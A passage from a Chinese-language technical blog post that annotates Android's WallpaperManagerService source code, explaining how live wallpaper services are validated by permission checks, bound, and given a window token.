ActivityManager.getService().registerUserSwitchObserver(</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">UserSwitchObserver</span>() &#123;</span><br><span class="line">                    <span class="meta">@Override</span></span><br><span class="line">                    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onUserSwitching</span><span class="params">(<span class="type">int</span> newUserId, IRemoteCallback reply)</span> &#123;</span><br><span class="line">                        switchUser(newUserId, reply);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;, TAG);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (RemoteException e) &#123;</span><br><span class="line">        e.rethrowAsRuntimeException();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>会通过 initialize() 方法调用 loadSettingsLocked() ⽅法加载⽤户设置过的壁纸信息，然后监听⽤户是否切换⽤户 switchUser()，当切换⽤户时，switchWallpaper() 会调⽤ bindWallpaperComponentLocked() ⽅法拉起对应的壁纸服务。</p><h4 id="2、⼿动切换时壁纸服务的启动流程"><a href="#2、⼿动切换时壁纸服务的启动流程" class="headerlink" title="2、⼿动切换时壁纸服务的启动流程"></a>2、⼿动切换时壁纸服务的启动流程</h4><p>⼿动切换壁纸（这里说的是动态壁纸）时需要通过WallpaperManager.getInstance(activity).setWallpaperComponent() ⽅法完成，我们在这个接⼝中传⼊壁纸服务对应的 ComponentName，getIWallpaperManager 返回的是 WallpaperManagerService 的 Bp(binder proxy binder代理) 端，在 WallpaperManagerService 端，我们可以查看到 setWallpaperComponent 的具体实现：</p><blockquote><p>注意：WallpaperManager.getIWallpaperManager() 并没有作为 SDK 的一部分提供给开发者。因此第三方应用无法进行动态壁纸的设置。</p></blockquote><p><strong>frameworks/base/services/core/java/com/android/server/wallpaper/WallpaperManagerService.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">setWallpaperComponent</span><span class="params">(ComponentName name, <span class="type">int</span> userId)</span> &#123;</span><br><span class="line">     userId = ActivityManager.handleIncomingUser(getCallingPid(), getCallingUid(), userId,</span><br><span class="line">             <span class="literal">false</span> <span class="comment">/* all */</span>, <span class="literal">true</span> <span class="comment">/* full */</span>, <span class="string">&quot;changing live wallpaper&quot;</span>, <span class="literal">null</span> <span class="comment">/* pkg */</span>);</span><br><span class="line">     <span class="comment">/* ⾸先调⽤该⽅法的时候回去校验权限，该权限定义在frameworks/base/core/res/AndroidManifest.xml，</span></span><br><span class="line"><span class="comment">        &lt;permission android:name=&quot;android.permission.SET_WALLPAPER_COMPONENT&quot;</span></span><br><span class="line"><span class="comment">         android:protectionLevel=&quot;signature|privileged&quot; /&gt;</span></span><br><span class="line"><span class="comment">        查看protectionLevel，只有是特权应⽤或者系统签名的应⽤才能获取到这个系统权限，所以普通的应⽤是没有办法进⾏壁纸设置的</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">     <span class="comment">// 设置动态壁纸需要调用者拥有一个签名级的系统权限</span></span><br><span class="line">     checkPermission(android.Manifest.permission.SET_WALLPAPER_COMPONENT);</span><br><span class="line">     <span class="type">int</span> <span class="variable">which</span> <span class="operator">=</span> FLAG_SYSTEM;</span><br><span class="line">     <span class="type">boolean</span> <span class="variable">shouldNotifyColors</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">     WallpaperData wallpaper;</span><br><span class="line">     <span class="keyword">synchronized</span> (mLock) &#123;</span><br><span class="line">         Slog.v(TAG, <span class="string">&quot;setWallpaperComponent name=&quot;</span> + name);</span><br><span class="line">         <span class="comment">/*</span></span><br><span class="line"><span class="comment">           此处会先通过当前的⽤户ID获取到与该⽤户相关的壁纸信息，WallpaperManagerService⽀持多⽤户机制，</span></span><br><span class="line"><span class="comment">           ⽤户的信息在mWallpaperMap中存储，每⼀个⽤户对应⼀个WallpaperData，</span></span><br><span class="line"><span class="comment">           WallpaperData存储壁纸相关信息，并在随后更新其内容使之保存新壁纸的信息。</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">         wallpaper = mWallpaperMap.get(userId);</span><br><span class="line">         <span class="keyword">if</span> (wallpaper == <span class="literal">null</span>) &#123;</span><br><span class="line">             <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(<span class="string">&quot;Wallpaper not yet initialized for user &quot;</span> + userId);</span><br><span class="line">         &#125;</span><br><span class="line">         <span class="comment">// 省略部分代码......</span></span><br><span class="line">         <span class="comment">// New live wallpaper is also a lock wallpaper if nothing is set</span></span><br><span class="line">         <span class="keyword">if</span> (mLockWallpaperMap.get(userId) == <span class="literal">null</span>) &#123;</span><br><span class="line">             which |= FLAG_LOCK;</span><br><span class="line">         &#125;</span><br><span class="line">         <span class="keyword">try</span> &#123;</span><br><span class="line">             wallpaper.imageWallpaperPending = <span class="literal">false</span>;</span><br><span class="line">             <span class="type">boolean</span> <span class="variable">same</span> <span class="operator">=</span> changingToSame(name, wallpaper);</span><br><span class="line">             <span class="comment">//   在这⾥真正会去拉起对应的 WallPaperService</span></span><br><span class="line">             <span class="keyword">if</span> (bindWallpaperComponentLocked(name, <span class="literal">false</span>, <span class="literal">true</span>, wallpaper, <span class="literal">null</span>)) &#123;</span><br><span class="line">                 <span class="comment">// 省略部分代码......</span></span><br><span class="line">             &#125;</span><br><span class="line">         &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">             Binder.restoreCallingIdentity(ident);</span><br><span class="line">         &#125;</span><br><span class="line">     &#125;</span><br><span class="line">       <span class="comment">// 省略部分代码......</span></span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>上述两种场景都是通过 bindWallpaperComponentLocked() 方法来拉起相关服务的。下面看看 bindWallpaperComponentLocked() 方法：<br><strong>frameworks/base/services/core/java/com/android/server/wallpaper/WallpaperManagerService.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="type">boolean</span> <span class="title function_">bindWallpaperComponentLocked</span><span class="params">(ComponentName componentName, <span class="type">boolean</span> force,</span></span><br><span class="line"><span class="params">        <span class="type">boolean</span> fromUser, WallpaperData wallpaper, IRemoteCallback reply)</span> &#123;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// 省略部分代码......</span></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 当componentName为null时表示使用默认壁纸。</span></span><br><span class="line">        <span class="comment">// 这里会将componentName参数改为默认壁纸的componentName</span></span><br><span class="line">        <span class="keyword">if</span> (componentName == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="comment">// mDefaultWallpaperComponent是从com.android.internal.R.string.default_wallpaper_component</span></span><br><span class="line">            <span class="comment">// 中获取默认壁纸的componentName。这个值的设置位于res/values/config.xml中，</span></span><br><span class="line">            <span class="comment">// 开发者可以通过修改这个值设置默认壁纸</span></span><br><span class="line">            componentName = mDefaultWallpaperComponent;</span><br><span class="line">            <span class="comment">// 倘若在上述的资源文件中没有指定一个默认壁纸，即default_wallpaper_component的</span></span><br><span class="line">            <span class="comment">// 值被设置为@null)，则使用ImageWallpaper代替默认壁纸。ImageWallpaper就是前文所述的静态壁纸,</span></span><br><span class="line">            <span class="comment">// 路径在：R.string.image_wallpaper_component</span></span><br><span class="line">            <span class="keyword">if</span> (componentName == <span class="literal">null</span>) &#123;</span><br><span class="line">                componentName = mImageWallpaper;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 接下来WallpaperMangerService会尝试从PackageManager中尝试获取ComponentName所</span></span><br><span class="line">        <span class="comment">// 指定的Service的描述信息,获取此信息的目的在于确认该Service是一个符合要求的壁纸服务</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">serviceUserId</span> <span class="operator">=</span> wallpaper.userId;</span><br><span class="line">        <span class="type">ServiceInfo</span> <span class="variable">si</span> <span class="operator">=</span> mIPackageManager.getServiceInfo(componentName,</span><br><span class="line">                PackageManager.GET_META_DATA | PackageManager.GET_PERMISSIONS, serviceUserId);</span><br><span class="line">        <span class="keyword">if</span> (si == <span class="literal">null</span>) &#123;</span><br><span class="line">         </span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 第一个检查，要求这个Service必须声明其访问权限为 BIND_WALLPAPER。</span></span><br><span class="line">        <span class="comment">// 这个签名级的系统权限这是为了防止壁纸服务被第三方应用程序启动而产生混乱</span></span><br><span class="line">        <span class="keyword">if</span> (!android.Manifest.permission.BIND_WALLPAPER.equals(si.permission)) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">msg</span> <span class="operator">=</span> <span class="string">&quot;Selected service does not have &quot;</span></span><br><span class="line">                    + android.Manifest.permission.BIND_WALLPAPER</span><br><span class="line">                    + <span class="string">&quot;: &quot;</span> + componentName;</span><br><span class="line">            <span class="keyword">if</span> (fromUser) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SecurityException</span>(msg);</span><br><span class="line">            &#125;</span><br><span class="line">            Slog.w(TAG, msg);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">WallpaperInfo</span> <span class="variable">wi</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="comment">// 第二个检查，要求这个Service必须可以用来处理android.service.wallpaper.WallpaperService这个Action</span></span><br><span class="line">        <span class="comment">// 其检查方式是从PackageManager中查询所有可以处理 android.service.wallpaper.WallpaperService的服务，</span></span><br><span class="line">        <span class="comment">// 然后检查即将启动的服务是否在PackageManager的查询结果之中</span></span><br><span class="line">        <span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>(WallpaperService.SERVICE_INTERFACE);</span><br><span class="line">        <span class="keyword">if</span> (componentName != <span class="literal">null</span> &amp;&amp; !componentName.equals(mImageWallpaper)) &#123;</span><br><span class="line">            <span class="comment">// Make sure the selected service is actually a wallpaper service.</span></span><br><span class="line">            <span class="comment">// 获取所有可以处理android.service.wallpaper.WallpaperService的服务信息</span></span><br><span class="line">            List&lt;ResolveInfo&gt; ris =</span><br><span class="line">                    mIPackageManager.queryIntentServices(intent,</span><br><span class="line">                            intent.resolveTypeIfNeeded(mContext.getContentResolver()),</span><br><span class="line">                            PackageManager.GET_META_DATA, serviceUserId).getList();</span><br><span class="line">            <span class="comment">// 第二个检查，这个检查来校验服务是否声明了android.service.wallpaper.WallpaperService这个action。</span></span><br><span class="line">            <span class="comment">// 如果这个服务没有声明这个action的话那么，ris中就不会含有这个component信息。</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>; i&lt;ris.size(); i++) &#123;</span><br><span class="line">                <span class="type">ServiceInfo</span> <span class="variable">rsi</span> <span class="operator">=</span> ris.get(i).serviceInfo;</span><br><span class="line">                <span class="keyword">if</span> (rsi.name.equals(si.name) &amp;&amp;</span><br><span class="line">                        rsi.packageName.equals(si.packageName)) &#123;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        <span class="comment">// 第三个检查，获取名为android.service.wallpaper中的meta-data信息，</span></span><br><span class="line">                        <span class="comment">// 该meta-data信息中提供了缩略图，开发者，简单的描述等。会将这些信息转换成 WallpaperInfo</span></span><br><span class="line">                         <span class="comment">// 如果即将启动的服务位于查询结果之中，便可以确定这是一个壁纸服务。</span></span><br><span class="line">                        wi = <span class="keyword">new</span> <span class="title class_">WallpaperInfo</span>(mContext, ris.get(i));</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (XmlPullParserException e) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (fromUser) &#123;</span><br><span class="line">                            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(e);</span><br><span class="line">                        &#125;</span><br><span class="line">                        Slog.w(TAG, e);</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (fromUser) &#123;</span><br><span class="line">                            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(e);</span><br><span class="line">                        &#125;</span><br><span class="line">                        Slog.w(TAG, e);</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (wi == <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="comment">// wi为null表示即将启动的服务没有位于查询结果之中，或者没有提供必须的meta-data。</span></span><br><span class="line">                <span class="comment">// 此时返回false表示绑定失败</span></span><br><span class="line">                <span class="type">String</span> <span class="variable">msg</span> <span class="operator">=</span> <span class="string">&quot;Selected service is not a wallpaper: &quot;</span></span><br><span class="line">                        + componentName;</span><br><span class="line">                <span class="keyword">if</span> (fromUser) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SecurityException</span>(msg);</span><br><span class="line">                &#125;</span><br><span class="line">                Slog.w(TAG, msg);</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 当壁纸服务⽀持在ambient模式下进⾏绘制的时候，需要检查是否有 AMBIENT_WALLPAPER 权限。</span></span><br><span class="line">        <span class="keyword">if</span> (wi != <span class="literal">null</span> &amp;&amp; wi.supportsAmbientMode()) &#123;</span><br><span class="line">            <span class="keyword">final</span> <span class="type">int</span> <span class="variable">hasPrivilege</span> <span class="operator">=</span> mIPackageManager.checkPermission(</span><br><span class="line">                    android.Manifest.permission.AMBIENT_WALLPAPER, wi.getPackageName(),</span><br><span class="line">                    serviceUserId);</span><br><span class="line">                    <span class="comment">// 省略部分代码......</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// Bind the service!</span></span><br><span class="line">        <span class="keyword">if</span> (DEBUG) Slog.v(TAG, <span class="string">&quot;Binding to:&quot;</span> + componentName);</span><br><span class="line">        <span class="keyword">final</span> <span class="type">int</span> <span class="variable">componentUid</span> <span class="operator">=</span> mIPackageManager.getPackageUid(componentName.getPackageName(),</span><br><span class="line">                MATCH_DIRECT_BOOT_AUTO, wallpaper.userId);</span><br><span class="line">        <span class="comment">// 1、这里创建一个WallpaperConnection，它不仅实现 ServiceConnetion 接口用于监听 WallpaperService 之间的连接状态,</span></span><br><span class="line">        <span class="comment">// 同时还实现了 IWallpaperService.Stub，也就说它支持跨进程通信。</span></span><br><span class="line">        <span class="comment">// 在服务绑定成功后的 WallpaperConnection.ServiceConnetion()方法调用中，WallpaperConnection 的实例回发送给 WallpaperService，</span></span><br><span class="line">        <span class="comment">// 使其作为 WallpaperService 向 WallpaperManagerService 通信的桥梁。</span></span><br><span class="line">        <span class="type">WallpaperConnection</span> <span class="variable">newConn</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">WallpaperConnection</span>(wi, wallpaper, componentUid);</span><br><span class="line">        <span class="comment">// 为启动壁纸服务准备Intent</span></span><br><span class="line">        intent.setComponent(componentName);</span><br><span class="line">        intent.putExtra(Intent.EXTRA_CLIENT_LABEL,</span><br><span class="line">                com.android.internal.R.string.wallpaper_binding_label);</span><br><span class="line">        intent.putExtra(Intent.EXTRA_CLIENT_INTENT, PendingIntent.getActivityAsUser(</span><br><span class="line">                mContext, <span class="number">0</span>,</span><br><span class="line">                Intent.createChooser(<span class="keyword">new</span> <span class="title class_">Intent</span>(Intent.ACTION_SET_WALLPAPER),</span><br><span class="line">                        mContext.getText(com.android.internal.R.string.chooser_wallpaper)),</span><br><span class="line">                PendingIntent.FLAG_IMMUTABLE, <span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">UserHandle</span>(serviceUserId)));</span><br><span class="line">        <span class="comment">// 2、这⾥启动指定的壁纸服务，服务启动后，壁纸还没有办法进⾏显⽰，</span></span><br><span class="line">        <span class="comment">// 还需要WallpaperConnection.onServiceConnected中进⾏相应的处理</span></span><br><span class="line">        <span class="keyword">if</span> (!mContext.bindServiceAsUser(intent, newConn,</span><br><span class="line">                Context.BIND_AUTO_CREATE | Context.BIND_SHOWING_UI</span><br><span class="line">                        | Context.BIND_FOREGROUND_SERVICE_WHILE_AWAKE</span><br><span class="line">                        | Context.BIND_INCLUDE_CAPABILITIES,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">UserHandle</span>(serviceUserId))) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">msg</span> <span class="operator">=</span> <span class="string">&quot;Unable to bind service: &quot;</span></span><br><span class="line">                    + componentName;</span><br><span class="line">            <span class="keyword">if</span> (fromUser) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(msg);</span><br><span class="line">            &#125;</span><br><span class="line">            Slog.w(TAG, msg);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 3、新的的壁纸服务启动成功后，便通过detachWallpaperLocked()销毁旧有的壁纸服务</span></span><br><span class="line">        <span class="keyword">if</span> (wallpaper.userId == mCurrentUserId &amp;&amp; mLastWallpaper != <span class="literal">null</span></span><br><span class="line">                &amp;&amp; !wallpaper.equals(mFallbackWallpaper)) &#123;</span><br><span class="line">            detachWallpaperLocked(mLastWallpaper);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 4、将新的壁纸服务的运行信息保存到WallpaperData中</span></span><br><span class="line">        wallpaper.wallpaperComponent = componentName;</span><br><span class="line">        wallpaper.connection = newConn;</span><br><span class="line">        newConn.mReply = reply;</span><br><span class="line">   </span><br><span class="line">        <span class="keyword">if</span> (wallpaper.userId == mCurrentUserId &amp;&amp; !wallpaper.equals(mFallbackWallpaper)) &#123;</span><br><span class="line">            mLastWallpaper = wallpaper;</span><br><span class="line">        &#125;</span><br><span class="line">        updateFallbackConnection();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (RemoteException e) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">msg</span> <span class="operator">=</span> <span class="string">&quot;Remote exception for &quot;</span> + componentName + <span class="string">&quot;\n&quot;</span> + e;</span><br><span class="line">        <span class="keyword">if</span> (fromUser) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(msg);</span><br><span class="line">        &#125; </span><br><span class="line">        Slog.w(TAG, msg);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上述代码主要做了两件事：</p><h4 id="1、检查拉起服务的条件"><a href="#1、检查拉起服务的条件" class="headerlink" title="1、检查拉起服务的条件"></a>1、检查拉起服务的条件</h4><ul><li>检查这个 Service 必须声明其访问权限为 BIND_WALLPAPER。为了防止壁纸服务被第三方应用程序启动而产生混乱。</li><li>检查服务是否声明了 android.service.wallpaper.WallpaperService 这个 action。如果这个服务没有声明这个 action 的话那么， ris 中就不会含有这个 component 信息。</li><li>检查这个 Service 在 meta-data 中有没有提供壁纸描述信息，该 meta-data 信息中提供了缩略图，开发者，简单的描述等。会将这些信息转换成 WallpaperInfo。</li></ul><h4 id="2、拉起壁纸服务"><a href="#2、拉起壁纸服务" class="headerlink" title="2、拉起壁纸服务"></a>2、拉起壁纸服务</h4><ul><li>创建了 WallpaperConnection 对象，由于实现了 ServiceConnection 接⼝，所以WallpaperConnection 可以⽤来监听和壁纸服务的连接状态，另外由于继承了IWallpoaperConnection.Stub 接⼝，所以 WallpaperConnection 具有了跨进程通信的能⼒。</li><li>启动壁纸服务：这⾥仅仅是拉起服务，和拉起普通服务的⽅式基本⼀致，拉起⽅式上则使⽤了 bindServiceAsUser，查看官⽅注解，该接口增加了校验该⽤户是否能拉起该服务，其余的⾏为和 bindService 相同。</li><li>保存当前 WallpaperConnection 实例，ConponentName，到 WallpaperData 中。</li></ul><p>bindWallpaperComponentLocked() 函数将壁纸服务拉了起来，但是仅仅将壁纸服务拉起来是没有办法显⽰图像的，因为启动的服务并没有窗口令牌，这样就没办法添加窗⼝。剩下的这部分显⽰的⼯作在 WallpaperConnection#onServiceConnected() ⽅法中进⾏，在该回调中同样也能拿到壁纸服务端提供的 Binder 对象。<br>WallpaperService 在被 bind(绑定 )的时候返回了一个 IWallpaperServiceWrapper 对象，从代码中可以看到，该对象中保存了 WallpaperService 实例：<br><strong>WallpaperConnection#onServiceConnected()</strong><br><strong>frameworks/base/services/core/java/com/android/server/wallpaper/WallpaperManagerService.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onServiceConnected</span><span class="params">(ComponentName name, IBinder service)</span> &#123;</span><br><span class="line">    <span class="keyword">synchronized</span> (mLock) &#123;</span><br><span class="line">        <span class="keyword">if</span> (mWallpaper.connection == <span class="built_in">this</span>) &#123;</span><br><span class="line">            <span class="comment">// 客户端 拿 WallpaperService 的 Binder</span></span><br><span class="line">            mService = IWallpaperService.Stub.asInterface(service);</span><br><span class="line">            <span class="comment">// 绑定壁纸服务。attachServiceLocked()会调用connectLocked()方法.</span></span><br><span class="line">            attachServiceLocked(<span class="built_in">this</span>, mWallpaper);</span><br><span class="line">            <span class="keyword">if</span> (!mWallpaper.equals(mFallbackWallpaper)) &#123;</span><br><span class="line">                <span class="comment">// 保存当前壁纸的运行状态到文件系统中，以便在系统重启或发生用户切换时可以恢复</span></span><br><span class="line">                saveSettingsLocked(mWallpaper.userId);</span><br><span class="line">            &#125;</span><br><span class="line">            FgThread.getHandler().removeCallbacks(mResetRunnable);</span><br><span class="line">            mContext.getMainThreadHandler().removeCallbacks(mTryToRebindRunnable);</span><br><span class="line">            <span class="keyword">if</span> (mPerformance != <span class="literal">null</span>) &#123;</span><br><span class="line">                mPerformance.notifyWallpaperChanged(name.getPackageName());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在 attachServiceLocked() 方法中会调用 connectLocked() 方法，connectLocked() 接口中调用了 IWallpaperServiceWrapper#attach() 方法传递了壁纸服务所需要的信息。<br><strong>WallpaperConnection#connectLocked()</strong><br><strong>frameworks/base/services/core/java/com/android/server/wallpaper/WallpaperManagerService.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> <span class="title function_">connectLocked</span><span class="params">(WallpaperConnection connection, WallpaperData wallpaper)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (connection.mService == <span class="literal">null</span>) &#123;</span><br><span class="line">        Slog.w(TAG, <span class="string">&quot;WallpaperService is not connected yet&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (DEBUG) Slog.v(TAG, <span class="string">&quot;Adding window token: &quot;</span> + mToken);</span><br><span class="line">    <span class="comment">// 向 WMS 申请注册一个WALLPAPER类型的窗口令牌，</span></span><br><span class="line">    <span class="comment">// 且之后被传递给 WallpaperService 用于作为后者添加窗口的通行证。</span></span><br><span class="line">    mWindowManagerInternal.addWindowToken(mToken, TYPE_WALLPAPER, mDisplayId);</span><br><span class="line">    <span class="keyword">final</span> <span class="type">DisplayData</span> <span class="variable">wpdData</span> <span class="operator">=</span> getDisplayDataOrCreate(mDisplayId);</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 调用 IWallpaperService.attach()方法将壁纸服务创建窗口所需的信息传递过去。</span></span><br><span class="line">        connection.mService.attach(connection, mToken, TYPE_WALLPAPER, <span class="literal">false</span>,</span><br><span class="line">                wpdData.mWidth, wpdData.mHeight,</span><br><span class="line">                wpdData.mPadding, mDisplayId);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (RemoteException 